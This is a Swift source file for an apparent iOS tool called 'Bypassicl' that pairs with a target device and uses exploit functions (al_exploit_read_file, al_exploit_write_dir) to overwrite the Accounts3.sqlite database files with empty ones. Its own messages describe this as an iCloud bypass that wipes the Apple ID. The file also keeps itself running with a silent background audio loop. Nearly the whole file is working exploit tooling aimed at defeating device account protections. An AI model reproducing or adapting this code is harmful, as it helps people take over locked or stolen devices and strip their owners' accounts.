// ============================================================
// AirliftService.swift — Bypassicl (Final Fix)
// ============================================================

import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation
import UIKit
import UserNotifications
import BackgroundTasks

@MainActor
class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    @Published var isProcessing = false
    @Published var showAlert = false
    @Published var alertMessage = ""
    
    private var netService: NetService?
    private var audioPlayer: AVAudioPlayer?
    private var bgTask: BGContinuedProcessingTask?
    private var pairingStarted = false
    private var taskFinished = false
    
    private let localNetwork = LocalNetworkAuthorization()
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0].appendingPathComponent("AccountsBackup")
    }
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { fm.fileExists(atPath: backupDir.appendingPathComponent($0).path) }
    }
    
    override init() {
        super.init()
        registerBackgroundTask()
    }
    
    // FIX: Bỏ private để ContentView có thể gọi
    func log(_ message: String) {
        self.logs += message + "\n"
        print(message)
    }
    
    // ============================================================
    // FFI CALLBACKS
    // ============================================================
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        if let rawString = String(validatingUTF8: msg) {
            let cleanString = rawString.replacingOccurrences(of: "\u{001B}\\[[0-9;]*[a-zA-Z]", with: "", options: .regularExpression)
            DispatchQueue.main.async { service.log("[Airlift] \(cleanString)") }
        }
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let ctx = ctx, let pin = pin else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN READY: \(pinStr)")
            service.presentPin(pinStr)
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceID, port, keys, vals, count in
        guard let ctx = ctx, let serviceID = serviceID else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let id = String(cString: serviceID)

        var txt: [String: Data] = [:]
        if let keys = keys, let vals = vals {
            for i in 0..<Int(count) {
                guard let k = keys[i], let v = vals[i] else { continue }
                txt[String(cString: k)] = Data(String(cString: v).utf8)
            }
        }

        DispatchQueue.main.async {
            service.startAdvertising(serviceID: id, port: Int32(port), txt: txt)
        }
    }
    
    // ============================================================
    // BACKGROUND TASK & AUDIO
    // ============================================================
    nonisolated private func registerBackgroundTask() {
        let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
        BGTaskScheduler.shared.register(forTaskWithIdentifier: taskId, using: DispatchQueue.main) { task in
            guard let task = task as? BGContinuedProcessingTask else { return }
            MainActor.assumeIsolated { AirliftService.shared.runPairing(task: task) }
        }
    }
    
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)
            let sr: UInt32 = 8000, ns: UInt32 = 8000, ds = ns * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + ds).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sr.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sr * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: ds.littleEndian) { Data($0) })
            wav.append(Data(count: Int(ds)))

            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch { log("⚠️ Audio keep-alive error: \(error.localizedDescription)") }
    }

    private func stopKeepAliveAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }
    
    // ============================================================
    // PAIRING LOGIC
    // ============================================================
    func startPairingOnDevice() {
        guard !isPairing else { return }
        self.isPairing = true
        self.currentPin = nil
        self.pairingStarted = false
        self.log("[*] Starting Pair on Device...")
        
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound]) { _, _ in }
        self.startKeepAliveAudio()
        
        Task.detached { [weak self] in _ = await self?.localNetwork.request() }
        self.submitBackgroundTask()
    }
    
    private func submitBackgroundTask() {
        let taskId = (Bundle.main.bundleIdentifier ?? "com.bypassicl.app") + ".pairing"
        let request = BGContinuedProcessingTaskRequest(identifier: taskId, title: "Bypassicl", subtitle: "Waiting for a device…")
        request.strategy = .queue
        do { try BGTaskScheduler.shared.submit(request) } catch {}
        self.runPairing(task: nil)
    }
    
    private func runPairing(task: BGContinuedProcessingTask?) {
        guard !pairingStarted else { return }
        pairingStarted = true
        taskFinished = false
        bgTask = task
        
        task?.progress.totalUnitCount = 100
        task?.progress.completedUnitCount = 5
        task?.expirationHandler = { [weak self] in
            guard let self = self else { return }
            Task { @MainActor in
                self.isPairing = false
                self.finishTask(success: false)
                self.log("❌ Background time expired.")
            }
        }
        
        let outPath = self.documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.global(qos: .userInitiated).async {
            var isSuccess = false
            var finalPath: String? = nil
            var finalName: String? = nil

            while true {
                var shouldContinue = false
                DispatchQueue.main.sync { shouldContinue = self.isPairing }
                if !shouldContinue { break }

                var result = ALPairResult()
                let code = al_pairing_run_host(
                    "0.0.0.0", 0, "Bypassicl", "Mac17,7", outPath, nil,
                    AirliftService.readyCallback, AirliftService.pinCallback, ctx, &result
                )

                if code == 0 {
                    isSuccess = true
                    if let p = result.pairing_file_path { finalPath = String(cString: p) }
                    if let n = result.device_name { finalName = String(cString: n) }
                    al_pairing_result_free(&result)
                    break
                } else {
                    al_pairing_result_free(&result)
                    DispatchQueue.main.async {
                        self.currentPin = nil
                        self.log("🔄 Ngắt kết nối. Đang khởi động lại Host...")
                    }
                    Thread.sleep(forTimeInterval: 0.5)
                }
            }

            DispatchQueue.main.async {
                self.pairingStarted = false
                self.isPairing = false
                self.currentPin = nil
                self.stopAdvertising()
                self.stopKeepAliveAudio()

                if isSuccess {
                    self.pairingFilePath = finalPath
                    self.lastDeviceName = finalName
                    self.log("✅ Pairing successful! File: \(finalPath ?? "")")
                    self.bgTask?.progress.completedUnitCount = 100
                    self.alertMessage = "Pairing Thành Công!"
                    self.showAlert = true
                } else {
                    self.log("⏹ Pairing cancelled.")
                }
                self.finishTask(success: isSuccess)
            }
        }
    }
    
    private func finishTask(success: Bool) {
        guard !taskFinished else { return }
        taskFinished = true
        bgTask?.setTaskCompleted(success: success)
        bgTask = nil
    }
    
    private func startAdvertising(serviceID: String, port: Int32, txt: [String: Data]) {
        stopAdvertising()
        let service = NetService(domain: "", type: "_remotepairing-pairable-host._tcp.", name: serviceID, port: port)
        service.setTXTRecord(NetService.data(fromTXTRecord: txt))
        service.schedule(in: .main, forMode: .common)
        service.delegate = self
        service.publish()
        netService = service
        log("🔊 Bonjour publishing: \(serviceID) @ \(port)")
    }
    
    private func stopAdvertising() {
        netService?.stop()
        netService = nil
    }
    
    private func presentPin(_ pin: String) {
        bgTask?.progress.completedUnitCount = 50
        bgTask?.updateTitle("Bypassicl", subtitle: "Enter code \(pin)")
        let content = UNMutableNotificationContent()
        content.title = "Bypassicl pairing code"
        content.body = "Enter \(pin) on this device to pair."
        content.sound = .default
        UNUserNotificationCenter.current().add(UNNotificationRequest(identifier: "bypassicl.pin", content: content, trigger: nil))
    }

    // ============================================================
    // CONNECT & IMPORT & FFI HELPERS
    // ============================================================
    func connect() -> Bool {
        log("[*] Checking pairing...")
        if pairingFilePath == nil {
            for name in ["pairingRecord.mobiledevicepairing", "pairingRecord.plist", "pairing.plist"] {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ No pairing file found.")
            return false
        }
        log("✅ Using pairing file: \(path)")
        return true
    }

    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        do {
            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            try Data(contentsOf: url).write(to: dest, options: .atomic)
            self.pairingFilePath = dest.path
            self.log("✅ Pairing file imported")
            self.alertMessage = "Import Pairing File Thành Công!"
            self.showAlert = true
        } catch { log("❌ Import failed: \(error.localizedDescription)") }
    }

    nonisolated private func ffi_read_file_internal(pairingPath: String, iosPath: String) -> Data? {
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_read_file(pairingPath, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        guard result == 0, let ptr = outData, outLen > 0 else { return nil }
        return Data(bytes: ptr, count: Int(outLen))
    }

    nonisolated private func ffi_write_dir_internal(pairingPath: String, sourceDir: String, targetDir: String) -> Bool {
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        let result = al_exploit_write_dir(pairingPath, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
        defer { if let e = outError { al_string_free(e) } }
        return result == 0
    }

    // ============================================================
    // BYPASS ICLOUD
    // ============================================================
    func bypassICloud() {
        guard !isProcessing else { return }
        guard connect(), let pairingPath = pairingFilePath else {
            log("❌ Bypass failed: Missing Pairing File.")
            return
        }
        
        isProcessing = true
        log("[*] Starting Bypass (Infinite Verify)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            
            try? FileManager.default.createDirectory(at: self.backupDir, withIntermediateDirectories: true)
            
            if !self.hasCompleteBackup {
                DispatchQueue.main.async { self.log("[*] Đang backup 3 file gốc...") }
                for file in self.targetFiles {
                    let path = "\(self.accountsDir)/\(file)"
                    var backedUp = false
                    while !backedUp {
                        if let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: path) {
                            try? data.write(to: self.backupDir.appendingPathComponent(file), options: .atomic)
                            DispatchQueue.main.async { self.log("✅ Đã backup: \(file)") }
                            backedUp = true
                        } else {
                            Thread.sleep(forTimeInterval: 1.0)
                        }
                    }
                }
            }
            
            let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
            try? FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
            for file in self.targetFiles {
                try? Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
            }
            
            var success = false
            while !success {
                DispatchQueue.main.async { self.log("⏳ Đang ghi đè file rỗng...") }
                _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: tmp.path, targetDir: self.accountsDir)
                
                Thread.sleep(forTimeInterval: 2.0)
                
                var allEmpty = true
                for file in self.targetFiles {
                    let path = "\(self.accountsDir)/\(file)"
                    if let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: path), !data.isEmpty {
                        allEmpty = false
                        break
                    }
                }
                
                if allEmpty {
                    success = true
                } else {
                    DispatchQueue.main.async { self.log("⚠️ File chưa rỗng hoàn toàn, thử lại...") }
                    Thread.sleep(forTimeInterval: 1.0)
                }
            }
            
            DispatchQueue.main.async {
                self.log("🎉 BYPASS THÀNH CÔNG! File đã rỗng.")
                self.isProcessing = false
                self.alertMessage = "Bypass iCloud Thành Công! Vui lòng khởi động lại thiết bị."
                self.showAlert = true
            }
            try? FileManager.default.removeItem(at: tmp)
        }
    }

    // ============================================================
    // RESTORE
    // ============================================================
    func restoreOriginalAccounts() {
        guard !isProcessing else { return }
        guard connect(), let pairingPath = pairingFilePath else {
            log("❌ Restore failed: Missing Pairing File.")
            return
        }
        
        isProcessing = true
        log("[*] Starting Restore (Infinite Verify)...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self = self else { return }
            
            let fm = FileManager.default
            let stagingDir = fm.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
            
            do {
                try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
                for file in self.targetFiles {
                    let backupFileURL = self.backupDir.appendingPathComponent(file)
                    guard fm.fileExists(atPath: backupFileURL.path) else {
                        DispatchQueue.main.async { 
                            self.log("❌ Missing backup: \(file)")
                            self.isProcessing = false 
                        }
                        return
                    }
                    try fm.copyItem(at: backupFileURL, to: stagingDir.appendingPathComponent(file))
                }
            } catch {
                DispatchQueue.main.async { 
                    self.log("❌ Restore prep: \(error.localizedDescription)")
                    self.isProcessing = false 
                }
                return
            }
            
            var success = false
            while !success {
                DispatchQueue.main.async { self.log("⏳ Đang nạp file backup vào máy...") }
                _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: stagingDir.path, targetDir: self.accountsDir)
                
                Thread.sleep(forTimeInterval: 2.0)
                
                var allExist = true
                for file in self.targetFiles {
                    let path = "\(self.accountsDir)/\(file)"
                    if self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: path) == nil {
                        allExist = false
                        break
                    }
                }
                
                if allExist { success = true } 
                else { Thread.sleep(forTimeInterval: 1.0) }
            }
            
            // XÓA SẠCH APPLE ID
            DispatchQueue.main.async { self.log("🧹 Đang xóa sạch Apple ID (Zeroing)...") }
            let emptyDir = fm.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
            try? fm.createDirectory(at: emptyDir, withIntermediateDirectories: true)
            for file in self.targetFiles {
                try? Data().write(to: emptyDir.appendingPathComponent(file), options: .atomic)
            }
            
            var wipeSuccess = false
            while !wipeSuccess {
                _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: emptyDir.path, targetDir: self.accountsDir)
                Thread.sleep(forTimeInterval: 2.0)
                
                var allEmpty = true
                for file in self.targetFiles {
                    let path = "\(self.accountsDir)/\(file)"
                    if let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: path), !data.isEmpty {
                        allEmpty = false
                        break
                    }
                }
                if allEmpty { wipeSuccess = true } else { Thread.sleep(forTimeInterval: 1.0) }
            }
            
            DispatchQueue.main.async {
                self.log("✅ RESTORE HOÀN TẤT! Đã xóa Apple ID.")
                self.isProcessing = false
                self.alertMessage = "Restore Thành Công! Đã xóa sạch Apple ID, vui lòng khởi động lại thiết bị."
                self.showAlert = true
            }
            
            try? fm.removeItem(at: stagingDir)
            try? fm.removeItem(at: emptyDir)
        }
    }
}

// ============================================================
// LOCAL NETWORK AUTHORIZATION
// ============================================================
@MainActor
final class LocalNetworkAuthorization {
    private var browser: NWBrowser?
    private var listener: NWListener?
    private var continuation: CheckedContinuation<Bool, Never>?
    private let probeType = "_bypassiclprobe._tcp"

    func request(timeout: TimeInterval = 5) async -> Bool {
        await withCheckedContinuation { (cont: CheckedContinuation<Bool, Never>) in
            self.continuation = cont
            let params = NWParameters.tcp
            params.includePeerToPeer = true

            let listener = try? NWListener(using: params)
            listener?.service = NWListener.Service(name: "BypassiclProbe", type: probeType)
            listener?.newConnectionHandler = { $0.cancel() }
            listener?.stateUpdateHandler = { [weak self] state in
                if case .failed = state { Task { @MainActor in self?.finish(false) } }
            }
            self.listener = listener

            let browser = NWBrowser(for: .bonjour(type: probeType, domain: nil), using: params)
            browser.stateUpdateHandler = { [weak self] state in
                if case .failed = state { Task { @MainActor in self?.finish(false) } }
            }
            browser.browseResultsChangedHandler = { [weak self] results, _ in
                if !results.isEmpty { Task { @MainActor in self?.finish(true) } }
            }
            self.browser = browser

            listener?.start(queue: .main)
            browser.start(queue: .main)

            DispatchQueue.main.asyncAfter(deadline: .now() + timeout) { [weak self] in
                Task { @MainActor in self?.finish(false) }
            }
        }
    }

    private func finish(_ authorized: Bool) {
        guard let cont = continuation else { return }
        continuation = nil
        cont.resume(returning: authorized)
        browser?.cancel(); browser = nil
        listener?.cancel(); listener = nil
    }
}